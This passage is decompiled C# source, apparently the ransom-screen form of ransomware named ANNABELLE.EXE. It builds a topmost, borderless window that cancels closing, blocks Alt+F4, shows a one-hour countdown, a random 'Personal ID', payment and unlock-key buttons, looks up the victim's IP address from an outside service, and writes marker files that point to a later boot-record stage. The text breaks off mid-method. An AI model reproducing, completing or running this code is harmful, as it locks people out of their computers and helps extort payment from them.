using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.VisualBasic.MyServices;
using Microsoft.Win32;

[DesignerGenerated]
public class Form2 : Form
{
	private IContainer icontainer_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	[CompilerGenerated]
	private Timer timer_0;

	[AccessedThroughProperty("Timer2")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Timer timer_1;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("Timer4")]
	private Timer timer_2;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer3")]
	[CompilerGenerated]
	private Timer timer_3;

	[CompilerGenerated]
	[AccessedThroughProperty("Timer5")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Timer timer_4;

	private const uint uint_0 = 793u;

	private const uint uint_1 = 10u;

	private WebClient webClient_0;

	internal virtual Timer Timer_0
	{
		[CompilerGenerated]
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_8;
			Timer val = timer_0;
			if (val != null)
			{
				Form2.smethod_22(val, eventHandler_);
			}
			timer_0 = value;
			val = timer_0;
			if (val != null)
			{
				Form2.smethod_23(val, eventHandler_);
			}
		}
	}

	internal virtual TextBox TextBox1
	{
		[CompilerGenerated]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			KeyEventHandler keyEventHandler_ = new KeyEventHandler(method_5);
			TextBox textBox = _TextBox1;
			if (textBox != null)
			{
				Form2.smethod_24((Control)(object)textBox, keyEventHandler_);
			}
			_TextBox1 = value;
			textBox = _TextBox1;
			if (textBox != null)
			{
				Form2.smethod_25((Control)(object)textBox, keyEventHandler_);
			}
		}
	}

	internal virtual Timer Timer_1
	{
		[CompilerGenerated]
		get
		{
			return timer_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_9;
			Timer val = timer_1;
			if (val != null)
			{
				Form2.smethod_22(val, eventHandler_);
			}
			timer_1 = value;
			val = timer_1;
			if (val != null)
			{
				Form2.smethod_23(val, eventHandler_);
			}
		}
	}

	[field: AccessedThroughProperty("ListBox1")]
	internal virtual ListBox ListBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_001a: Expected O, but got Unknown
			EventHandler eventHandler_ = method_0;
			KeyEventHandler keyEventHandler_ = new KeyEventHandler(method_4);
			Button button = _Button1;
			if (button != null)
			{
				Form2.smethod_26((Control)(object)button, eventHandler_);
				Form2.smethod_24((Control)(object)button, keyEventHandler_);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				Form2.smethod_27((Control)(object)button, eventHandler_);
				Form2.smethod_25((Control)(object)button, keyEventHandler_);
			}
		}
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button8
	{
		[CompilerGenerated]
		get
		{
			return _Button8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_15;
			Button button = _Button8;
			if (button != null)
			{
				Form2.smethod_26((Control)(object)button, eventHandler_);
			}
			_Button8 = value;
			button = _Button8;
			if (button != null)
			{
				Form2.smethod_27((Control)(object)button, eventHandler_);
			}
		}
	}

	internal virtual Button Button7
	{
		[CompilerGenerated]
		get
		{
			return _Button7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_11;
			Button button = _Button7;
			if (button != null)
			{
				Form2.smethod_26((Control)(object)button, eventHandler_);
			}
			_Button7 = value;
			button = _Button7;
			if (button != null)
			{
				Form2.smethod_27((Control)(object)button, eventHandler_);
			}
		}
	}

	internal virtual Button Button3
	{
		[CompilerGenerated]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_10;
			Button button = _Button3;
			if (button != null)
			{
				Form2.smethod_26((Control)(object)button, eventHandler_);
			}
			_Button3 = value;
			button = _Button3;
			if (button != null)
			{
				Form2.smethod_27((Control)(object)button, eventHandler_);
			}
		}
	}

	[field: AccessedThroughProperty("RichTextBox1")]
	internal virtual RichTextBox RichTextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button6
	{
		[CompilerGenerated]
		get
		{
			return _Button6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_13;
			Button button = _Button6;
			if (button != null)
			{
				Form2.smethod_26((Control)(object)button, eventHandler_);
			}
			_Button6 = value;
			button = _Button6;
			if (button != null)
			{
				Form2.smethod_27((Control)(object)button, eventHandler_);
			}
		}
	}

	internal virtual Button Button4
	{
		[CompilerGenerated]
		get
		{
			return _Button4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_12;
			Button button = _Button4;
			if (button != null)
			{
				Form2.smethod_26((Control)(object)button, eventHandler_);
			}
			_Button4 = value;
			button = _Button4;
			if (button != null)
			{
				Form2.smethod_27((Control)(object)button, eventHandler_);
			}
		}
	}

	[field: AccessedThroughProperty("Button5")]
	internal virtual Button Button5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer_2
	{
		[CompilerGenerated]
		get
		{
			return timer_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			timer_2 = value;
		}
	}

	[field: AccessedThroughProperty("Label8")]
	internal virtual Label Label8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Lengthh")]
	internal virtual TextBox Lengthh
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Result")]
	internal virtual Label Result
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer_3
	{
		[CompilerGenerated]
		get
		{
			return timer_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_14;
			Timer val = timer_3;
			if (val != null)
			{
				Form2.smethod_22(val, eventHandler_);
			}
			timer_3 = value;
			val = timer_3;
			if (val != null)
			{
				Form2.smethod_23(val, eventHandler_);
			}
		}
	}

	internal virtual Timer Timer_4
	{
		[CompilerGenerated]
		get
		{
			return timer_4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_16;
			Timer val = timer_4;
			if (val != null)
			{
				Form2.smethod_22(val, eventHandler_);
			}
			timer_4 = value;
			val = timer_4;
			if (val != null)
			{
				Form2.smethod_23(val, eventHandler_);
			}
		}
	}

	CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			Form2.smethod_29(createParams, Form2.smethod_28(createParams) | 0x200);
			return createParams;
		}
	}

	public Form2()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		Form2.smethod_0((Form)(object)this, new FormClosingEventHandler(method_1));
		Form2.smethod_1((Form)(object)this, (EventHandler)method_3);
		Form2.smethod_2((Form)(object)this, (EventHandler)method_7);
		webClient_0 = Form2.smethod_3();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	void Form.Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				Form2.smethod_4((IDisposable)icontainer_0);
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_02a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b3: Expected O, but got Unknown
		//IL_034c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0356: Expected O, but got Unknown
		//IL_0409: Unknown result type (might be due to invalid IL or missing references)
		//IL_0413: Expected O, but got Unknown
		//IL_04cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d7: Expected O, but got Unknown
		//IL_0597: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a1: Expected O, but got Unknown
		//IL_06dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e7: Expected O, but got Unknown
		//IL_07bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_07c7: Expected O, but got Unknown
		//IL_08a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_08b0: Expected O, but got Unknown
		//IL_095f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0969: Expected O, but got Unknown
		//IL_0a00: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a0a: Expected O, but got Unknown
		//IL_0a9f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aa9: Expected O, but got Unknown
		//IL_0bab: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bb5: Expected O, but got Unknown
		//IL_0c4e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c58: Expected O, but got Unknown
		//IL_0cf5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cff: Expected O, but got Unknown
		icontainer_0 = Form2.smethod_5();
		ComponentResourceManager componentResourceManager = Form2.smethod_7(Form2.smethod_6(typeof(Form2).TypeHandle));
		Timer_0 = Form2.smethod_8(icontainer_0);
		TextBox1 = Form2.smethod_9();
		Timer_1 = Form2.smethod_8(icontainer_0);
		ListBox1 = Form2.smethod_10();
		Button1 = Form2.smethod_11();
		Label1 = Form2.smethod_12();
		Button8 = Form2.smethod_11();
		Button7 = Form2.smethod_11();
		Button3 = Form2.smethod_11();
		RichTextBox1 = Form2.smethod_13();
		Button6 = Form2.smethod_11();
		Button4 = Form2.smethod_11();
		Button5 = Form2.smethod_11();
		Label2 = Form2.smethod_12();
		Label3 = Form2.smethod_12();
		Timer_2 = Form2.smethod_8(icontainer_0);
		Label8 = Form2.smethod_12();
		Lengthh = Form2.smethod_9();
		Result = Form2.smethod_12();
		Label4 = Form2.smethod_12();
		Timer_3 = Form2.smethod_8(icontainer_0);
		Timer_4 = Form2.smethod_8(icontainer_0);
		Form2.smethod_14((Control)(object)this);
		Form2.smethod_15((TextBoxBase)(object)TextBox1, Color.White);
		Form2.smethod_17((Control)(object)TextBox1, Form2.smethod_16());
		Form2.smethod_19((Control)(object)TextBox1, Form2.smethod_18("Arial", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Form2.smethod_21((TextBoxBase)(object)TextBox1, Form2.smethod_20());
		((Control)TextBox1).set_Location(new Point(12, 521));
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(813, 32));
		((Control)TextBox1).set_TabIndex(44);
		TextBox1.set_UseSystemPasswordChar(true);
		ListBox1.set_BackColor(Color.Black);
		ListBox1.set_ForeColor(Color.FromArgb(192, 0, 0));
		((ListControl)ListBox1).set_FormattingEnabled(true);
		((Control)ListBox1).set_Location(new Point(12, 54));
		((Control)ListBox1).set_Name("ListBox1");
		((Control)ListBox1).set_Size(new Size(588, 95));
		((Control)ListBox1).set_TabIndex(50);
		((ButtonBase)Button1).set_BackColor(Color.LightGray);
		((ButtonBase)Button1).get_FlatAppearance().set_MouseDownBackColor(Color.Gray);
		((ButtonBase)Button1).get_FlatAppearance().set_MouseOverBackColor(Color.Silver);
		((ButtonBase)Button1).set_FlatStyle((FlatStyle)0);
		((Control)Button1).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button1).set_Location(new Point(686, 478));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(139, 39));
		((Control)Button1).set_TabIndex(43);
		((ButtonBase)Button1).set_Text("Check Payment / Get Code");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.Transparent);
		((Control)Label1).set_Font(new Font("YouMurderer BB", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.DarkRed);
		((Control)Label1).set_Location(new Point(400, 486));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(0, 24));
		((Control)Label1).set_TabIndex(55);
		((ButtonBase)Button8).set_BackColor(Color.LightGray);
		((ButtonBase)Button8).get_FlatAppearance().set_MouseDownBackColor(Color.Gray);
		((ButtonBase)Button8).get_FlatAppearance().set_MouseOverBackColor(Color.Silver);
		((ButtonBase)Button8).set_FlatStyle((FlatStyle)0);
		((Control)Button8).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button8).set_Location(new Point(114, 12));
		((Control)Button8).set_Name("Button8");
		((Control)Button8).set_Size(new Size(97, 36));
		((Control)Button8).set_TabIndex(48);
		((ButtonBase)Button8).set_Text("Information");
		((ButtonBase)Button8).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button7).set_BackColor(Color.LightGray);
		((ButtonBase)Button7).get_FlatAppearance().set_MouseDownBackColor(Color.Gray);
		((ButtonBase)Button7).get_FlatAppearance().set_MouseOverBackColor(Color.Silver);
		((ButtonBase)Button7).set_FlatStyle((FlatStyle)0);
		((Control)Button7).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button7).set_Location(new Point(278, 478));
		((Control)Button7).set_Name("Button7");
		((Control)Button7).set_Size(new Size(97, 39));
		((Control)Button7).set_TabIndex(47);
		((ButtonBase)Button7).set_Text("Hide Files");
		((ButtonBase)Button7).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button3).set_BackColor(Color.LightGray);
		((ButtonBase)Button3).get_FlatAppearance().set_MouseDownBackColor(Color.Gray);
		((ButtonBase)Button3).get_FlatAppearance().set_MouseOverBackColor(Color.Silver);
		((ButtonBase)Button3).set_FlatStyle((FlatStyle)0);
		((Control)Button3).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button3).set_Location(new Point(169, 478));
		((Control)Button3).set_Name("Button3");
		((Control)Button3).set_Size(new Size(103, 39));
		((Control)Button3).set_TabIndex(49);
		((ButtonBase)Button3).set_Text("Encrypted Files");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(false);
		((TextBoxBase)RichTextBox1).set_AcceptsTab(true);
		((Control)RichTextBox1).set_Location(new Point(12, 155));
		((Control)RichTextBox1).set_Name("RichTextBox1");
		((TextBoxBase)RichTextBox1).set_ReadOnly(true);
		((Control)RichTextBox1).set_Size(new Size(588, 304));
		((Control)RichTextBox1).set_TabIndex(56);
		RichTextBox1.set_Text(componentResourceManager.GetString("RichTextBox1.Text"));
		((ButtonBase)Button6).set_BackColor(Color.LightGray);
		((ButtonBase)Button6).get_FlatAppearance().set_MouseDownBackColor(Color.Gray);
		((ButtonBase)Button6).get_FlatAppearance().set_MouseOverBackColor(Color.Silver);
		((ButtonBase)Button6).set_FlatStyle((FlatStyle)0);
		((Control)Button6).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button6).set_ForeColor(Color.Black);
		((ButtonBase)Button6).set_ImageAlign((ContentAlignment)2);
		((Control)Button6).set_Location(new Point(12, 12));
		((Control)Button6).set_Name("Button6");
		((Control)Button6).set_Size(new Size(96, 36));
		((Control)Button6).set_TabIndex(57);
		((ButtonBase)Button6).set_Text("Credits");
		((ButtonBase)Button6).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button4).set_BackColor(Color.LightGray);
		((ButtonBase)Button4).get_FlatAppearance().set_MouseDownBackColor(Color.Gray);
		((ButtonBase)Button4).get_FlatAppearance().set_MouseOverBackColor(Color.Silver);
		((ButtonBase)Button4).set_FlatStyle((FlatStyle)0);
		((Control)Button4).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button4).set_ForeColor(Color.Black);
		((ButtonBase)Button4).set_ImageAlign((ContentAlignment)2);
		((Control)Button4).set_Location(new Point(246, 538));
		((Control)Button4).set_Name("Button4");
		((Control)Button4).set_Size(new Size(354, 32));
		((Control)Button4).set_TabIndex(58);
		((ButtonBase)Button4).set_Text("Enter Unlock Key");
		((ButtonBase)Button4).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button5).set_BackColor(Color.LightGray);
		((ButtonBase)Button5).get_FlatAppearance().set_MouseDownBackColor(Color.Gray);
		((ButtonBase)Button5).get_FlatAppearance().set_MouseOverBackColor(Color.Silver);
		((ButtonBase)Button5).set_FlatStyle((FlatStyle)0);
		((Control)Button5).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button5).set_ForeColor(Color.Black);
		((ButtonBase)Button5).set_ImageAlign((ContentAlignment)2);
		((Control)Button5).set_Location(new Point(834, -28));
		((Control)Button5).set_Name("Button5");
		((Control)Button5).set_Size(new Size(96, 36));
		((Control)Button5).set_TabIndex(59);
		((ButtonBase)Button5).set_Text("Exit");
		((ButtonBase)Button5).set_UseVisualStyleBackColor(false);
		Label2.set_AutoSize(true);
		((Control)Label2).set_BackColor(Color.Transparent);
		((Control)Label2).set_Font(new Font("Comic Sans MS", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.DarkRed);
		((Control)Label2).set_Location(new Point(89, 480));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(75, 33));
		((Control)Label2).set_TabIndex(63);
		Label2.set_Text("3600");
		Label3.set_AutoSize(true);
		((Control)Label3).set_BackColor(Color.Transparent);
		((Control)Label3).set_Font(new Font("Comic Sans MS", 20.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(Color.DarkRed);
		((Control)Label3).set_Location(new Point(12, 476));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(86, 38));
		((Control)Label3).set_TabIndex(64);
		Label3.set_Text("Time:");
		((Control)Label8).set_BackColor(Color.Black);
		Label8.set_BorderStyle((BorderStyle)1);
		((Control)Label8).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)1));
		((Control)Label8).set_ForeColor(Color.Red);
		((Control)Label8).set_Location(new Point(12, 155));
		((Control)Label8).set_Name("Label8");
		((Control)Label8).set_Size(new Size(588, 21));
		((Control)Label8).set_TabIndex(65);
		Label8.set_Text("Frequently Asked Questions");
		Label8.set_TextAlign((ContentAlignment)16);
		((Control)Lengthh).set_Location(new Point(738, 452));
		((Control)Lengthh).set_Name("Lengthh");
		((Control)Lengthh).set_Size(new Size(87, 20));
		((Control)Lengthh).set_TabIndex(66);
		Lengthh.set_Text("8");
		Result.set_AutoSize(true);
		((Control)Result).set_BackColor(Color.Transparent);
		((Control)Result).set_Font(new Font("Comic Sans MS", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Result).set_ForeColor(Color.DarkRed);
		((Control)Result).set_Location(new Point(692, 7));
		((Control)Result).set_Name("Result");
		((Control)Result).set_Size(new Size(146, 33));
		((Control)Result).set_TabIndex(67);
		Result.set_Text("Personal ID");
		Label4.set_AutoSize(true);
		((Control)Label4).set_BackColor(Color.Transparent);
		((Control)Label4).set_Font(new Font("Comic Sans MS", 20.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label4).set_ForeColor(Color.DarkRed);
		((Control)Label4).set_Location(new Point(459, 3));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(238, 38));
		((Control)Label4).set_TabIndex(68);
		Label4.set_Text("Your Personal ID:");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(833, 561));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)Result);
		((Control)this).get_Controls().Add((Control)(object)Lengthh);
		((Control)this).get_Controls().Add((Control)(object)Label8);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Button5);
		((Control)this).get_Controls().Add((Control)(object)Button4);
		((Control)this).get_Controls().Add((Control)(object)Button6);
		((Control)this).get_Controls().Add((Control)(object)RichTextBox1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Control)this).get_Controls().Add((Control)(object)Button3);
		((Control)this).get_Controls().Add((Control)(object)Button8);
		((Control)this).get_Controls().Add((Control)(object)Button7);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form2");
		((Control)this).set_RightToLeft((RightToLeft)0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_2, IntPtr intptr_1, IntPtr intptr_2);

	private void method_0(object sender, EventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		Form2.smethod_30((object)"You didnt paid yet.", (MsgBoxStyle)16, (object)"ANNABELLE.EXE");
	}

	private void method_1(object sender, FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)Form2.smethod_31(e) == 3)
		{
			Form2.smethod_32((CancelEventArgs)(object)e, bool_0: true);
		}
	}

	public object method_2()
	{
		object result = default(object);
		try
		{
			string text = Form2.smethod_33(webClient_0, "http://myip.dnsomatic.com/");
			result = text;
			return result;
		}
		catch (Exception exception_)
		{
			Form2.smethod_34(exception_);
			Form2.smethod_35();
			return result;
		}
	}

	private void method_3(object sender, EventArgs e)
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		if (Form2.smethod_36("C:\\Save1.txt"))
		{
			method_17();
		}
		if (!Form2.smethod_37())
		{
			Form2.smethod_30((object)"The Program is on a 32 Bit Operating System not available, because 32 Bit is outdated.", (MsgBoxStyle)16, (object)"ANNABELLE.EXE");
			Form2.smethod_38((Form)(object)this);
		}
		Form2.smethod_39(Timer_3);
		Form2.smethod_40((Control)(object)Lengthh);
		string text = "";
		text = "";
		text = Form2.smethod_41(text, "0123456789");
		text = Form2.smethod_41(text, "abcdefghijklmnopqrstuvwxyz");
		text = Form2.smethod_41(text, "ABCDEFGHIJKLMNOPQRSTUVWXYZ");
		int i = 0;
		Form2.smethod_42(Result, "");
		Random random_ = Form2.smethod_43();
		string text2 = "";
		checked
		{
			for (; (double)i <= Form2.smethod_52(Form2.smethod_51(Lengthh)); i++)
			{
				text2 = Form2.smethod_46(Form2.smethod_45(random_, 0, Form2.smethod_44(text)));
				Form2.smethod_42(Result, Form2.smethod_41(Form2.smethod_47(Result), Form2.smethod_50(Form2.smethod_49(text, Form2.smethod_48(text2)))));
			}
			Form2.smethod_53((Control)(object)this, bool_0: false);
			Form2.smethod_54((TextBoxBase)(object)RichTextBox1, 2);
			Form2.smethod_55(RichTextBox1, 27);
			Form2.smethod_57(RichTextBox1, Form2.smethod_56("Calibri", 15f, (FontStyle)1));
			Form2.smethod_54((TextBoxBase)(object)RichTextBox1, 150);
			Form2.smethod_55(RichTextBox1, 30);
			Form2.smethod_57(RichTextBox1, Form2.smethod_56("Calibri", 15f, (FontStyle)1));
			Form2.smethod_54((TextBoxBase)(object)RichTextBox1, 490);
			Form2.smethod_55(RichTextBox1, 33);
			Form2.smethod_57(RichTextBox1, Form2.smethod_56("Calibri", 15f, (FontStyle)1));
			Form2.smethod_54((TextBoxBase)(object)RichTextBox1, 628);
			Form2.smethod_55(RichTextBox1, 47);
			Form2.smethod_57(RichTextBox1, Form2.smethod_56("Calibri", 15f, (FontStyle)1));
			Form2.smethod_54((TextBoxBase)(object)RichTextBox1, 892);
			Form2.smethod_55(RichTextBox1, 36);
			Form2.smethod_57(RichTextBox1, Form2.smethod_56("Calibri", 15f, (FontStyle)1));
			if (!Form2.smethod_36("C:\\Detect.txt"))
			{
				int num = 100;
				do
				{
					SendMessage(this.method_65(), 793u, (IntPtr)197266, (IntPtr)655360L);
					num += -1;
				}
				while (num >= 1);
				Form2.smethod_62(Form2.smethod_60((Computer)(object)Class1.Class0_0), (Stream)Class5.UnmanagedMemoryStream_2, (AudioPlayMode)0);
				Form2.smethod_61(Form2.smethod_60((Computer)(object)Class1.Class0_0));
				Form2.smethod_62(Form2.smethod_60((Computer)(object)Class1.Class0_0), (Stream)Class5.UnmanagedMemoryStream_0, (AudioPlayMode)2);
			}
			else
			{
				Form2.smethod_58(Timer_0);
				Form2.smethod_59(Timer_1, 30);
				Form2.smethod_39(Timer_1);
				Form2.smethod_61(Form2.smethod_60((Computer)(object)Class1.Class0_0));
				Form2.smethod_62(Form2.smethod_60((Computer)(object)Class1.Class0_0), (Stream)Class5.UnmanagedMemoryStream_0, (AudioPlayMode)2);
			}
			if (Form2.smethod_36("C:\\AfterMBR.txt"))
			{
				Form2.smethod_39(Timer_4);
			}
			string string_ = "C:\\Detect.txt";
			FileStream fileStream = Form2.smethod_63(string_);
			byte[] array = Form2.smethod_65((Encoding)Form2.smethod_64(bool_0: true), "Detect");
			Form2.smethod_66(fileStream, array, 0, array.Length);
			Form2.smethod_67((Stream)fileStream);
			Form2.smethod_40((Control)(object)ListBox1);
			Form2.smethod_68();
			Form2.smethod_69();
		}
	}

	private void method_4(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		if ((int)Form2.smethod_70(e) == 262259)
		{
			Form2.smethod_73(Form2.smethod_72(new string[7]
			{
				"Annabelle",
				Form2.smethod_71(),
				"Just",
				Form2.smethod_71(),
				"Wants",
				Form2.smethod_71(),
				"To"
			}), "Play", (MessageBoxButtons)0, (MessageBoxIcon)64);
			Form2.smethod_74(e, bool_0: true);
		}
	}

	private void method_5(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Invalid comparison between Unknown and I4
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d3: Invalid comparison between Unknown and I4
		if ((int)Form2.smethod_70(e) == 262259)
		{
			Form2.smethod_73(Form2.smethod_72(new string[7]
			{
				"Annabelle",
				Form2.smethod_71(),
				"Just",
				Form2.smethod_71(),
				"Wants",
				Form2.smethod_71(),
				"To"
			}), "Play", (MessageBoxButtons)0, (MessageBoxIcon)64);
			Form2.smethod_74(e, bool_0: true);
		}
		if ((int)Form2.smethod_70(e) == 35)
		{
			Form2.smethod_73(Form2.smethod_72(new string[7]
			{
				"Annabelle",
				Form2.smethod_71(),
				"Just",
				Form2.smethod_71(),
				"Wants",
				Form2.smethod_71(),
				"To"
			}), "Play", (MessageBoxButtons)0, (MessageBoxIcon)64);
			Form2.smethod_74(e, bool_0: true);
		}
		if ((int)Form2.smethod_70(e) != 13)
		{
		}
	}

	private void method_6(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Invalid comparison between Unknown and I4
